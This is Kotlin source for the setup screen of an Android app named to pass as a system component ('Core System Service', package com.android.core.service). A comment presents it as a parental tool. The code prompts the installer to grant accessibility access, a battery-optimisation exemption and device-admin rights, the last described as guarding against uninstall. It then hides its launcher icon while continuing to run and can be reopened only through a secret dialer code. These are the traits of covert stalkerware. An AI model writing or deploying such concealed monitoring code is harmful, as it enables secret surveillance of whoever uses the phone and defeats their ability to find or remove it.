package com.android.core.service

import android.accessibilityservice.AccessibilityServiceInfo
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.net.Uri
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.accessibility.AccessibilityManager
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast

/**
 * Setup wizard — visible ONLY on first install.
 * After "Setup Complete" is tapped, the launcher icon is hidden.
 * Parent can re-show this screen by dialing *#1234# in phone dialer.
 */
class MainActivity : Activity() {

    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var adminComponent: ComponentName
    private lateinit var statusView: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminComponent = ComponentName(this, AdminReceiver::class.java)

        // ── Build UI programmatically (no layout XML needed) ──────────────────
        val scroll = ScrollView(this)
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(48, 64, 48, 64)
        }

        val title = TextView(this).apply {
            text = "Core System Service"
            textSize = 22f
            setTextColor(Color.BLACK)
            setPadding(0, 0, 0, 8)
        }

        val subtitle = TextView(this).apply {
            text = "System configuration utility v1.0"
            textSize = 13f
            setTextColor(Color.DKGRAY)
            setPadding(0, 0, 0, 32)
        }

        statusView = TextView(this).apply {
            textSize = 14f
            setPadding(0, 0, 0, 32)
        }

        val btn1 = makeButton("Step 1 — Enable Accessibility Service") {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }

        val hint1 = makeHint("Find 'Core System' and toggle it ON")

        val btn2 = makeButton("Step 2 — Exempt Battery Optimization") {
            requestBatteryExemption()
        }

        val hint2 = makeHint("Prevents OS from killing the service")

        val btn3 = makeButton("Step 3 — Activate Device Admin") {
            activateDeviceAdmin()
        }

        val hint3 = makeHint("Protects against accidental uninstall")

        val divider = TextView(this).apply {
            setPadding(0, 24, 0, 24)
        }

        val btnComplete = Button(this).apply {
            text = "✓  Setup Complete — Hide App"
            setBackgroundColor(Color.parseColor("#1565C0"))
            setTextColor(Color.WHITE)
            textSize = 16f
            setPadding(32, 24, 32, 24)
            setOnClickListener { completeSetup() }
        }

        val footer = makeHint(
            "After hiding: dial *#1234# in phone dialer to re-open this screen"
        )

        root.addView(title)
        root.addView(subtitle)
        root.addView(statusView)
        root.addView(btn1)
        root.addView(hint1)
        root.addView(btn2)
        root.addView(hint2)
        root.addView(btn3)
        root.addView(hint3)
        root.addView(divider)
        root.addView(btnComplete)
        root.addView(footer)

        scroll.addView(root)
        setContentView(scroll)
    }

    override fun onResume() {
        super.onResume()
        refreshStatus()
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    private fun makeButton(label: String, onClick: () -> Unit) = Button(this).apply {
        text = label
        textSize = 14f
        setPadding(16, 20, 16, 20)
        setOnClickListener { onClick() }
    }

    private fun makeHint(text: String) = TextView(this).apply {
        this.text = "  ↳ $text"
        textSize = 12f
        setTextColor(Color.GRAY)
        setPadding(0, 0, 0, 24)
    }

    private fun refreshStatus() {
        val accessOk = isAccessibilityEnabled()
        val adminOk = devicePolicyManager.isAdminActive(adminComponent)
        val batteryOk = isBatteryExempt()

        statusView.text = buildString {
            append("Status:\n")
            append("  Accessibility  : ${if (accessOk) "✓ Enabled" else "✗ Disabled"}\n")
            append("  Battery exempt : ${if (batteryOk) "✓ Yes" else "✗ No"}\n")
            append("  Device Admin   : ${if (adminOk) "✓ Active" else "✗ Inactive"}")
        }
        statusView.setTextColor(if (accessOk && adminOk) Color.parseColor("#2E7D32") else Color.DKGRAY)
    }

    private fun isAccessibilityEnabled(): Boolean {
        val am = getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
        return am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
            .any { it.resolveInfo.serviceInfo.packageName == packageName }
    }

    private fun isBatteryExempt(): Boolean {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        return pm.isIgnoringBatteryOptimizations(packageName)
    }

    private fun requestBatteryExemption() {
        if (!isBatteryExempt()) {
            startActivity(
                Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
            )
        } else {
            toast("Battery optimization already disabled ✓")
        }
    }

    private fun activateDeviceAdmin() {
        if (!devicePolicyManager.isAdminActive(adminComponent)) {
            startActivity(
                Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                    putExtra(
                        DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Required for core system management"
                    )
                }
            )
        } else {
            toast("Device Admin already active ✓")
        }
    }

    private fun completeSetup() {
        if (!isAccessibilityEnabled()) {
            toast("Please enable the Accessibility Service first (Step 1)")
            return
        }

        // Mark setup done
        getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            .edit()
            .putBoolean(KEY_SETUP_DONE, true)
            .apply()

        toast("Setup complete! App icon will now disappear.")

        // Hide launcher icon — app remains installed and active
        packageManager.setComponentEnabledSetting(
            ComponentName(this, MainActivity::class.java),
            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            android.content.pm.PackageManager.DONT_KILL_APP
        )

        finish()
    }

    private fun toast(msg: String) =
        Toast.makeText(this, msg, Toast.LENGTH_LONG).show()

    companion object {
        const val PREFS_NAME = "gg_prefs"
        const val KEY_SETUP_DONE = "setup_done"
    }
}
